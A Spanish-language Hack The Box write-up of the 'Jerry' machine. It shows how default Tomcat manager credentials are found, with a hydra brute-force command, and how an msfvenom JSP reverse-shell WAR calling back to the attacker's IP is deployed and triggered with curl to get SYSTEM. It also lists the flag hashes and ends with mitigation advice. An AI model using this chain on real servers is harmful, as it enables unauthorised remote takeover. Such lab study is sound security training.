---
titulo: "Jerry"
fecha: 2026-10-14
plataforma: htb
so: windows
dificultad: Easy
estado: pendiente
tecnicas: [tomcat, credenciales-por-defecto, war-malicioso]
herramientas: [nmap, msfvenom]
---

# Jerry

## Resumen

Servidor Apache Tomcat cuyo panel de gestión usa credenciales por defecto. Con ellas se despliega un `.war` malicioso que da una shell con privilegios de `SYSTEM`, ya que Tomcat corre como servicio.

## Índice
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Explotación](#3-explotación)
4. [Postexplotación](#4-postexplotación)

---

## 1. Reconocimiento

Comprobamos que la máquina está activa:

```bash
ping -c 4 10.129.75.155
```

---

## 2. Enumeración

### 2.1 Escaneo de puertos

```bash
nmap -p- --min-rate 5000 -T4 10.129.75.155 > ~/HTB_machines/Jerry/allports
```

> **Nota:** Aunque en HTB podríamos usar `-A --script vuln` directamente, en un entorno real sería demasiado agresivo. Hacerlo por partes es mejor práctica.

**Resultado:** puerto `8080` abierto como proxy HTTP.

```bash
nmap -p 8080 -sC -sV 10.129.75.155 -oN ~/HTB_machines/Jerry/targeted
```

**Resultado:** Apache Tomcat 7.0.88 con Coyote JSP engine 1.1. Versión antigua con configuración por defecto.

---

### 2.2 Identificación de vectores

Accedemos desde el navegador a `http://10.129.75.155:8080/`. Al pulsar **Manager App**, la página de error **401 Unauthorized** expone las credenciales de ejemplo:

| Campo | Valor |
|-------|-------|
| Usuario | `tomcat` |
| Password | `s3cret` |

> **Fallo crítico de configuración:** la instalación por defecto de Tomcat muestra credenciales en la página de error.

En un entorno real usaríamos fuerza bruta:

```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt 10.129.75.155 -s 8080 http-get /manager/html
```

Una vez dentro del manager identificamos dos vectores:
- Panel con aplicaciones desplegadas y subdominios activos.
- Opción de **subir archivos WAR** → permite desplegar código Java arbitrario.

---

## 3. Explotación

Un archivo **WAR (Web Application Archive)** es un paquete ZIP con una aplicación web Java. Tomcat está diseñado para recibirlos y desplegarlos — metemos una reverse shell dentro.

> **¿Qué es una reverse shell?**  
> En lugar de conectarnos a la víctima, es ella quien se conecta a nosotros. Esto evita firewalls que bloqueen conexiones entrantes.

### Paso 1 — Generar el WAR malicioso

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.39 LPORT=4444 -f war -o shell.war
```

| Flag | Descripción |
|------|-------------|
| `-p java/jsp_shell_reverse_tcp` | Payload Java compatible con Tomcat |
| `LHOST` | Nuestra IP de la VPN de HTB (`tun0`), **no** la IP local |
| `LPORT` | Puerto donde escucharemos |
| `-f war` | Formato WAR |
| `-o shell.war` | Archivo de salida |

### Paso 2 — Ponerse en escucha

```bash
nc -lvnp 4444
```

### Paso 3 — Subir el WAR

`http://10.129.75.155:8080/manager/html` → sección **WAR file to deploy** → seleccionamos `shell.war` → **Deploy**. Tomcat despliega la app y aparece como `/shell`.

### Paso 4 — Ejecutar la shell

```bash
curl http://10.129.75.155:8080/shell/
```

> El `curl` es el gatillo. El payload se conecta a nuestro `nc` y el curl quedará colgado mientras la shell esté activa — comportamiento esperado. También funciona desde el navegador.

---

## 4. Postexplotación

Jerry es una máquina **Windows**. Los comandos cambian:

| Linux | Windows |
|-------|---------|
| `ls` | `dir` |
| `cat archivo` | `type archivo` |
| `pwd` | `cd` |

Comprobamos privilegios:


> Tomcat en Windows suele correr con privilegios elevados. En esta máquina **no es necesario escalar privilegios**.

Navegamos a las flags:


> Jerry tiene una particularidad: ambas flags están en un único archivo.

### Flags

| | Hash |
|-|------|
| Usuario | `7004dbcef0f854e0fb401875f26ebd00` |
| Administrador | `04a8b36e1545a455393d067e772fe90e` |

---

*Write-up por [ph4n3s](https://github.com/phanesopenyoureyes) — seguiré mejorando conforme aprenda más.*

## Mitigación

Cambiar siempre las credenciales por defecto del panel de gestión de Tomcat y usar contraseñas robustas. Restringir el acceso a `/manager` por IP. Ejecutar Tomcat con una cuenta de servicio de privilegios mínimos, no como `SYSTEM`.

## Qué he aprendido

PENDIENTE

